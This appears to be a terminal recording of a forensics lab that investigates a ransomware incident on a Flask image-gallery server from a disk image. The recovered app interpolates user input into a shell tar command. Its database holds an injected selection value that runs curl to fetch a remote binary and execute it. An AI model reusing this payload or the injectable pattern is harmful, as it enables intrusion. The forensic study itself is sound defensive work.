@@ -1,0 +1,944 @@
+Script started on 2026-10-23 02:32:52+03:00 [COMMAND="ssh -i ubuntu.key ubuntu@dead.endpoint.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host 'dead.endpoint.thm (10.82.177.127)' can't be established.
+ED25519 key fingerprint is: SHA256:LNDBmjfUeewHGC/bodKFMKh80Z6+TbN5Trde7bgl8fk
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'dead.endpoint.thm' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1016-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 22 23:32:54 UTC 2026
+
+  System load:  1.49               Temperature:           -273.1 C
+  Usage of /:   54.7% of 43.55GB   Processes:             226
+  Memory usage: 23%                Users logged in:       0
+  Swap usage:   0%                 IPv4 address for ens5: 10.82.177.127
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+718 updates can be applied immediately.
+497 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+55 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ ls
+[?2004l[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  [01;34mVideos[0m  [01;34msnap[0m
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ cd Desktop/
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ ls
+[?2004l[0m[01;34martifacts[0m  [01;32mmate-terminal.desktop[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ cd artifacts/
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls
+[?2004ldisk.img  [0m[01;34mtools[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ du -sh disk.img 
+[?2004l13G	disk.img
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls tools/
+[?2004l [0m[01;32mGhidra.desktop[0m            [01;36mfile[0m       [01;36mfsstat[0m                 [01;36micat[0m         [01;36mobjdump[0m   [01;36mreadelf[0m         [01;36mstrings[0m
+[01;32m'SQLite Browser.desktop'[0m   [01;36mfls[0m        [01;36mghidra[0m                 [01;36mjournalctl[0m   [01;36mpluma[0m     [01;36msqlite3[0m         [01;36mxxd[0m
+ [01;36meom[0m                       [01;36mforemost[0m   [01;34mghidra_12.1.4_PUBLIC[0m   [01;36mmmls[0m         [01;36mpython3[0m   [01;36msqlitebrowser[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mmmls disk.img[27mmmls disk.img
+[?2004lGUID Partition Table (EFI)
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Safety Table
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  Meta      0000000001   0000000001   0000000001   GPT Header
+003:  Meta      0000000002   0000000033   0000000032   Partition Table
+004:  013       0000002048   0000010239   0000008192   
+005:  014       0000010240   0000227327   0000217088   
+006:  015       0000227328   0002097152   0001869825   
+007:  -------   0002097153   0002099199   0000002047   Unallocated
+008:  000       0002099200   0025165790   0023066591   
+009:  -------   0025165791   0025165823   0000000033   Unallocated
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mfsstat -o 2099200 disk.img | head -20[27mfsstat -o 2099200 disk.img | head -20
+[?2004lFILE SYSTEM INFORMATION
+--------------------------------------------
+File System Type: Ext4
+Volume Name: cloudimg-rootfs
+Volume ID: c2af1e2e0b774a8ea04e6fa7d04b1359
+
+Last Written at: 2026-10-20 05:37:22 (UTC)
+Last Checked at: 2026-10-17 12:57:55 (UTC)
+
+Last Mounted at: 2026-10-19 05:26:02 (UTC)
+Unmounted properly
+Last mounted on: /
+
+Source OS: Linux
+Dynamic Structure
+Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index
+InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups, 
+Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size
+
+Journal ID: 00
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mfls -r -p -o 2099200 disk.img > ~/fls_all.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cfls -r -p -o 2099200 disk.img > ~/fls_all.txt
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mwc -l ~/fls_all.txt[27mwc -l ~/fls_all.txt
+[?2004l86582 /home/ubuntu/fls_all.txt
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -iE "gallery|photo" ~/fls_all.txt | head -40[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -iE "gallery|photo" ~/fls_all.txt | head -40
+[?2004ll/l 469:	etc/systemd/system/multi-user.target.wants/gallery.service
+r/r 437:	etc/systemd/system/gallery.service
+r/r 1643:	etc/cloud/templates/chrony.conf.photon.tmpl
+r/r 1659:	etc/cloud/templates/hosts.photon.tmpl
+r/r 1669:	etc/cloud/templates/ntp.conf.photon.tmpl
+d/d 263162:	etc/gallery
+r/r 263170:	etc/gallery/gallery.env
+r/r 263171:	etc/nginx/sites-available/gallery
+l/l 262197:	etc/nginx/sites-enabled/gallery
+d/d 263152:	srv/gallery
+r/r 263153:	srv/gallery/.bash_logout
+r/r 263154:	srv/gallery/.bashrc
+r/r 263155:	srv/gallery/.profile
+d/d 263156:	srv/gallery/app
+r/r 263163:	srv/gallery/app/gallery.py
+d/d 263164:	srv/gallery/app/static
+r/r 263165:	srv/gallery/app/static/gallery.css
+d/d 263166:	srv/gallery/app/templates
+r/r 263167:	srv/gallery/app/templates/base.html
+r/r 263168:	srv/gallery/app/templates/index.html
+r/r 263169:	srv/gallery/app/templates/login.html
+d/d 263179:	srv/gallery/app/__pycache__
+r/r 263180:	srv/gallery/app/__pycache__/gallery.cpython-312.pyc
+d/d 263157:	srv/gallery/media
+d/d 263158:	srv/gallery/media/originals
+r/r 263210:	srv/gallery/media/originals/yard_0152.jpg.locked
+r/r 263213:	srv/gallery/media/originals/RESTORE.txt
+r/r 262186:	srv/gallery/media/originals/yard_0147.jpg.locked
+r/r 263208:	srv/gallery/media/originals/yard_0148.jpg.locked
+d/d 263159:	srv/gallery/data
+r/r 263181:	srv/gallery/data/gallery.sqlite3
+r/r 263182:	srv/gallery/data/gallery.sqlite3-wal
+r/r 263183:	srv/gallery/data/gallery.sqlite3-shm
+d/d 263160:	srv/gallery/exports
+r/r 262187:	srv/gallery/exports/8452cfc730ed4198.tar
+r/r 263209:	srv/gallery/exports/13efec482c8a4ccc.tar
+r/r 263211:	srv/gallery/exports/27ee23c277fb4bc9.tar
+d/d 263161:	srv/gallery/.cache
+r/r 263212:	srv/gallery/.cache/.indexd
+r/r 20265:	usr/lib/python3/dist-packages/cloudinit/distros/photon.py
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -E "var/log/journal|var/log/(nginx|apache2)|\.db$|\.sqlite" ~/fls_all.txt | [27m[7mh[27m[7mead -40[27m[A]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ grep -E "var/log/journal|var/log/(nginx|apache2)|\.db$|\.sqlite" ~/fls_all.txt | head -40
+[?2004lr/r 263181:	srv/gallery/data/gallery.sqlite3
+r/r 263182:	srv/gallery/data/gallery.sqlite3-wal
+r/r 263183:	srv/gallery/data/gallery.sqlite3-shm
+r/r 43535:	usr/share/mime/application/vnd.sqlite3.xml
+r/r 84676:	var/lib/command-not-found/commands.db
+r/r 81171:	var/lib/PackageKit/transactions.db
+r/r 263198:	var/lib/fwupd/pending.db
+r/r 84506:	var/cache/man/pt_BR/index.db
+r/r 84507:	var/cache/man/index.db
+r/r 84512:	var/cache/man/zh_CN/index.db
+r/r 84517:	var/cache/man/it/index.db
+r/r 84523:	var/cache/man/uk/index.db
+r/r 84528:	var/cache/man/ko/index.db
+r/r 84533:	var/cache/man/da/index.db
+r/r 84538:	var/cache/man/zh_TW/index.db
+r/r 84543:	var/cache/man/fr/index.db
+r/r 84547:	var/cache/man/sl/index.db
+r/r 84552:	var/cache/man/cs/index.db
+r/r 84558:	var/cache/man/sv/index.db
+r/r 84564:	var/cache/man/de/index.db
+r/r 84569:	var/cache/man/es/index.db
+r/r 84575:	var/cache/man/ro/index.db
+r/r 84580:	var/cache/man/tr/index.db
+r/r 84586:	var/cache/man/pt/index.db
+r/r 84591:	var/cache/man/hu/index.db
+r/r 84594:	var/cache/man/fi/index.db
+r/r 84599:	var/cache/man/id/index.db
+r/r 84605:	var/cache/man/pl/index.db
+r/r 84608:	var/cache/man/hr/index.db
+r/r 84613:	var/cache/man/ja/index.db
+r/r 84618:	var/cache/man/ru/index.db
+r/r 84623:	var/cache/man/sr/index.db
+r/r 84629:	var/cache/man/nl/index.db
+r/r 263199:	var/cache/fwupd/quirks.db
+d/d 84654:	var/log/journal
+d/d 84689:	var/log/journal/ceec051e334c47ce94258c815f77ad50
+r/r 85188:	var/log/journal/ceec051e334c47ce94258c815f77ad50/system.journal
+r/r 84697:	var/log/journal/ceec051e334c47ce94258c815f77ad50/system@ffd3be51fe0549efa582c732834ec434-0000000000000234-00065e2abfe467aa.journal
+d/d 262448:	var/log/nginx
+r/r 262195:	var/log/nginx/access.log
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -E "/(tmp|var/tmp|dev/shm)/\." ~/fls_all.txt | head -20[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -E "/(tmp|var/tmp|dev/shm)/\." ~/fls_all.txt | head -20
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -E "^r/r.*/\.[a-zA-Z0-9_]+/\.[a-zA-Z0-9_]+$" ~/fls_all.txt | grep -vE "\.(ca[27m[7mc[27m[7mhe|config|local|mozilla)" | head -40[27m[A]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ grep -E "^r/r.*/\.[a-zA-Z0-9_]+/\.[a-zA-Z0-9_]+$" ~/fls_all.txt | grep -vE "\.(cache|config|local|mozilla)" | head -40
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mmkdir -p ~/work && cd ~/work[27mmkdir -p ~/work && cd ~/work
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 ../Desktop/artifacts/disk.img 263163 > gallery.py[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 ../Desktop/artifacts/disk.img 263163 > gallery.py
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcat gallery.py[27mcat gallery.py
+[?2004l"""Meridian internal image library."""
+from datetime import datetime, timezone
+from functools import wraps
+from pathlib import Path
+import hashlib
+import io
+import json
+import logging
+import os
+import secrets
+import sqlite3
+import subprocess
+import threading
+import uuid
+
+from flask import Flask, Request, abort, jsonify, redirect, render_template, request, send_file, session, url_for
+from PIL import Image
+
+BASE = Path("/srv/gallery")
+ORIGINALS = BASE / "media" / "originals"
+EXPORTS = BASE / "exports"
+DATABASE = BASE / "data" / "gallery.sqlite3"
+ALLOWED = {
+    "yard_0147.jpg", "yard_0148.jpg", "yard_0152.jpg",
+}
+
+class ImageRequest(Request):
+    def _get_file_stream(self, total_content_length, content_type, filename=None, content_length=None):
+        return io.BytesIO()
+
+app = Flask(__name__)
+app.request_class = ImageRequest
+app.secret_key = os.environ["GALLERY_SESSION_KEY"]
+app.config.update(MAX_CONTENT_LENGTH=10 * 1024 * 1024, SESSION_COOKIE_HTTPONLY=True,
+                  SESSION_COOKIE_SAMESITE="Lax")
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+LOG = logging.getLogger("gallery")
+
+def utcnow():
+    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")
+
+def connect():
+    db = sqlite3.connect(DATABASE)
+    db.row_factory = sqlite3.Row
+    return db
+
+def initialize():
+    for directory in (ORIGINALS, EXPORTS, DATABASE.parent):
+        directory.mkdir(parents=True, exist_ok=True)
+    with connect() as db:
+        db.executescript("""
+          PRAGMA journal_mode=WAL;
+          CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY, username TEXT UNIQUE NOT NULL,
+            salt TEXT NOT NULL, password_hash TEXT NOT NULL, display_name TEXT NOT NULL);
+          CREATE TABLE IF NOT EXISTS albums (
+            id INTEGER PRIMARY KEY, title TEXT NOT NULL, description TEXT NOT NULL);
+          CREATE TABLE IF NOT EXISTS photos (
+            filename TEXT PRIMARY KEY, album_id INTEGER NOT NULL, caption TEXT NOT NULL,
+            uploaded_by INTEGER NOT NULL, uploaded_at TEXT NOT NULL, bytes INTEGER NOT NULL);
+          CREATE TABLE IF NOT EXISTS exports (
+            id TEXT PRIMARY KEY, album_id INTEGER NOT NULL, requested_by INTEGER NOT NULL,
+            requested_at TEXT NOT NULL, completed_at TEXT, state TEXT NOT NULL,
+            selection TEXT NOT NULL, filename TEXT);
+          CREATE TABLE IF NOT EXISTS activity (
+            id INTEGER PRIMARY KEY, time TEXT NOT NULL, user_id INTEGER,
+            action TEXT NOT NULL, detail TEXT NOT NULL);
+        """)
+        db.execute("INSERT OR IGNORE INTO albums VALUES (1, ?, ?)",
+                   ("North yard inspection", "Loading bays, boundary access and delivery records."))
+
+def add_user(username, password, display_name):
+    salt = secrets.token_hex(16)
+    digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt), n=16384, r=8, p=1).hex()
+    with connect() as db:
+        db.execute("INSERT OR IGNORE INTO users(username,salt,password_hash,display_name) VALUES(?,?,?,?)",
+                   (username, salt, digest, display_name))
+
+def authenticated(function):
+    @wraps(function)
+    def wrapped(*args, **kwargs):
+        if not session.get("user_id"):
+            return redirect(url_for("login"))
+        return function(*args, **kwargs)
+    return wrapped
+
+def event(action, detail):
+    with connect() as db:
+        db.execute("INSERT INTO activity(time,user_id,action,detail) VALUES(?,?,?,?)",
+                   (utcnow(), session.get("user_id"), action, detail))
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    error = None
+    if request.method == "POST":
+        with connect() as db:
+            user = db.execute("SELECT * FROM users WHERE username=?", (request.form.get("username", ""),)).fetchone()
+        password = request.form.get("password", "")
+        if user:
+            digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(user["salt"]), n=16384, r=8, p=1).hex()
+            if secrets.compare_digest(digest, user["password_hash"]):
+                session.clear()
+                session.update(user_id=user["id"], display_name=user["display_name"])
+                event("sign_in", request.remote_addr or "")
+                return redirect(url_for("index"))
+        error = "The username or password was not recognized."
+    return render_template("login.html", error=error)
+
+@app.get("/")
+@authenticated
+def index():
+    with connect() as db:
+        photos = db.execute("SELECT * FROM photos ORDER BY uploaded_at").fetchall()
+        exports = db.execute("SELECT * FROM exports ORDER BY requested_at DESC LIMIT 8").fetchall()
+    return render_template("index.html", photos=photos, exports=exports)
+
+@app.get("/media/<name>")
+@authenticated
+def media(name):
+    if name not in ALLOWED:
+        abort(404)
+    path = ORIGINALS / name
+    if not path.is_file():
+        abort(404)
+    return send_file(path, mimetype="image/jpeg", conditional=True, max_age=0)
+
+@app.post("/api/photos")
+@authenticated
+def upload():
+    file = request.files.get("photo")
+    if not file or file.filename not in ALLOWED:
+        abort(400)
+    path = ORIGINALS / file.filename
+    if path.exists() or path.with_name(path.name + ".locked").exists():
+        abort(409)
+    data = file.read()
+    if len(data) > 8 * 1024 * 1024:
+        abort(413)
+    with Image.open(io.BytesIO(data)) as image:
+        if image.format != "JPEG":
+            abort(400)
+        image.verify()
+    with path.open("xb") as out:
+        out.write(data)
+        out.flush()
+        os.fsync(out.fileno())
+    with connect() as db:
+        db.execute("INSERT INTO photos VALUES(?,?,?,?,?,?)", (file.filename, 1,
+                   request.form.get("caption", "")[:200], session["user_id"], utcnow(), len(data)))
+    event("photo_uploaded", file.filename)
+    LOG.info("photo accepted name=%s bytes=%d", file.filename, len(data))
+    return jsonify(filename=file.filename), 201
+
+def export_job(job_id, selection):
+    filename = job_id + ".tar"
+    destination = EXPORTS / filename
+    LOG.info("export started job=%s", job_id)
+    # The legacy name selector is interpolated by this application's export worker.
+    command = f"/bin/tar -cf '{destination}' -C '{ORIGINALS}' {selection}"
+    try:
+        process = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=45)
+        if process.stdout:
+            LOG.info("export worker job=%s %s", job_id, process.stdout.strip()[:500])
+        if process.stderr:
+            LOG.warning("export worker job=%s %s", job_id, process.stderr.strip()[:500])
+        state = "ready" if process.returncode == 0 and destination.exists() else "failed"
+    except subprocess.TimeoutExpired:
+        state = "failed"
+    with connect() as db:
+        db.execute("UPDATE exports SET completed_at=?,state=?,filename=? WHERE id=?",
+                   (utcnow(), state, filename if state == "ready" else None, job_id))
+    LOG.info("export finished job=%s state=%s", job_id, state)
+
+@app.post("/api/albums/<int:album_id>/export")
+@authenticated
+def export(album_id):
+    if album_id != 1:
+        abort(404)
+    body = request.get_json(silent=True) or {}
+    selection = body.get("selection", ".")
+    if not isinstance(selection, str) or len(selection) > 1000:
+        abort(400)
+    job_id = uuid.uuid4().hex[:16]
+    with connect() as db:
+        db.execute("INSERT INTO exports VALUES(?,?,?,?,?,?,?,?)",
+                   (job_id, album_id, session["user_id"], utcnow(), None, "queued", selection, None))
+    event("export_requested", job_id)
+    threading.Thread(target=export_job, args=(job_id, selection), daemon=True).start()
+    return jsonify(id=job_id, state="queued"), 202
+
+@app.get("/api/exports/<job_id>")
+@authenticated
+def export_status(job_id):
+    with connect() as db:
+        record = db.execute("SELECT id,state,completed_at FROM exports WHERE id=?", (job_id,)).fetchone()
+    if not record:
+        abort(404)
+    return jsonify(dict(record))
+
+@app.get("/exports/<job_id>")
+@authenticated
+def download(job_id):
+    with connect() as db:
+        record = db.execute("SELECT * FROM exports WHERE id=?", (job_id,)).fetchone()
+    if not record or record["state"] != "ready":
+        abort(404)
+    return send_file(EXPORTS / record["filename"], as_attachment=True, download_name="north-yard.tar")
+
+@app.get("/health")
+def health():
+    return jsonify(status="ok")
+
+initialize()
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mgrep -nE "route|subprocess|os\.system|popen|shell=True" gallery.py[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -nE "route|subprocess|os\.system|popen|shell=True" gallery.py
+[?2004l[32m[K12[m[K[36m[K:[m[Kimport [01;31m[Ksubprocess[m[K
+[32m[K92[m[K[36m[K:[m[K@app.[01;31m[Kroute[m[K("/login", methods=["GET", "POST"])
+[32m[K161[m[K[36m[K:[m[K        process = [01;31m[Ksubprocess[m[K.run(command, [01;31m[Kshell=True[m[K, capture_output=True, text=True, timeout=45)
+[32m[K167[m[K[36m[K:[m[K    except [01;31m[Ksubprocess[m[K.TimeoutExpired:
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 ../Desktop/artifacts/disk.img 262195 > access.log[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 ../Desktop/artifacts/disk.img 262195 > access.log
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mwc -l access.log[27mwc -l access.log
+[?2004l0 access.log
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mgrep -vE "\.(css|jpg|png|ico)" access.log | head -60[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -vE "\.(css|jpg|png|ico)" access.log | head -60
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mgrep -iE "export|POST|cmd|%20|;|\.\./" access.log | head -40[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -iE "export|POST|cmd|%20|;|\.\./" access.log | head -40
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 ../Desktop/artifacts/disk.img 263213 > RESTORE.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 ../Desktop/artifacts/disk.img 263213 > RESTORE.txt
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcat RESTORE.txt[27mcat RESTORE.txt
+[?2004lYour image library has been locked.
+Keep the affected files and their names unchanged.
+For recovery instructions contact restore@notice.invalid.
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 ../Desktop/artifacts/disk.img 263170 > gallery.env[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 ../Desktop/artifacts/disk.img 263170 > gallery.env
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcat gallery.env[27mcat gallery.env
+[?2004lGALLERY_SESSION_KEY=ed91fd0d92166205caa8eeeefbfaf824a75aca87bf93e91c697525b85927c575
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 ../Desktop/artifacts/disk.img 437 > gallery.service[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 ../Desktop/artifacts/disk.img 437 > gallery.service
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcat gallery.service[27mcat gallery.service
+[?2004l[Unit]
+Description=Meridian image library
+After=network.target
+[Service]
+Type=simple
+User=gallery
+Group=gallery
+WorkingDirectory=/srv/gallery/app
+EnvironmentFile=/etc/gallery/gallery.env
+ExecStart=/usr/bin/gunicorn --workers 1 --threads 4 --bind 127.0.0.1:8080 --access-logfile - --error-logfile - gallery:app
+Restart=on-failure
+UMask=0027
+NoNewPrivileges=true
+PrivateTmp=true
+ProtectSystem=strict
+ProtectHome=true
+ReadWritePaths=/srv/gallery
+MemoryMax=384M
+[Install]
+WantedBy=multi-user.target
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcd ~/work && mkdir -p db && cd db[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd ~/work && mkdir -p db && cd db
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7mIMG=~/Desktop/artifacts/disk.img[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CIMG=~/Desktop/artifacts/disk.img
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7micat -o 2099200 $IMG 263181 > gallery.sqlite3[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263181 > gallery.sqlite3
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7micat -o 2099200 $IMG 263182 > gallery.sqlite3-wal[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263182 > gallery.sqlite3-wal
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7micat -o 2099200 $IMG 263183 > gallery.sqlite3-shm[27m
+[7mls -l[27m[A]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ icat -o 2099200 $IMG 263183 > gallery.sqlite3-shm
+ls -l
+[?2004ltotal 204
+-rw-rw-r-- 1 ubuntu ubuntu   4096 Oct 22 23:43 gallery.sqlite3
+-rw-rw-r-- 1 ubuntu ubuntu  32768 Oct 22 23:43 gallery.sqlite3-shm
+-rw-rw-r-- 1 ubuntu ubuntu 168952 Oct 22 23:43 gallery.sqlite3-wal
+[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7msqlite3 gallery.sqlite3 "select id,requested_at,state,selection from exports order by reque[27m[7ms[27m[7mted_at;"[27m[A]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ sqlite3 gallery.sqlite3 "select id,requested_at,state,selection from exports order by requested_at;"
+[?2004l8452cfc730ed4198|2026-10-20T05:36:37.489+00:00|ready|yard_0147.jpg
+13efec482c8a4ccc|2026-10-20T05:36:41.606+00:00|ready|.
+27ee23c277fb4bc9|2026-10-20T05:36:54.547+00:00|ready|yard_0147.jpg; curl -fsS http://10.0.2.2:18081/assets/media-worker -o /srv/gallery/.cache/.indexd && chmod 700 /srv/gallery/.cache/.indexd && /srv/gallery/.cache/.indexd
+[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7msqlite3 gallery.sqlite3 "select time,user_id,action,detail from activity order by time;"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csqlite3 gallery.sqlite3 "select time,user_id,action,detail from activity order by time;"
+[?2004l2026-10-20T05:36:37.139+00:00|1|sign_in|127.0.0.1
+2026-10-20T05:36:37.372+00:00|1|photo_uploaded|yard_0147.jpg
+2026-10-20T05:36:37.495+00:00|1|export_requested|8452cfc730ed4198
+2026-10-20T05:36:41.398+00:00|2|sign_in|127.0.0.1
+2026-10-20T05:36:41.516+00:00|2|photo_uploaded|yard_0148.jpg
+2026-10-20T05:36:41.613+00:00|2|export_requested|13efec482c8a4ccc
+2026-10-20T05:36:50.442+00:00|1|photo_uploaded|yard_0152.jpg
+2026-10-20T05:36:54.554+00:00|1|export_requested|27ee23c277fb4bc9
+[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7msqlite3 gallery.sqlite3 "select id,username,display_name from users;"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csqlite3 gallery.sqlite3 "select id,username,display_name from users;"
+[?2004l1|m.smith|Michelle Smith
+2|s.reyes|Sofia Reyes
+[?2004h]0;ubuntu@tryhackme: ~/work/db[01;32mubuntu@tryhackme[00m:[01;34m~/work/db[00m$ [7mcd ~/work[27mcd ~/work
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 85188 > system.journal[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 85188 > system.journal
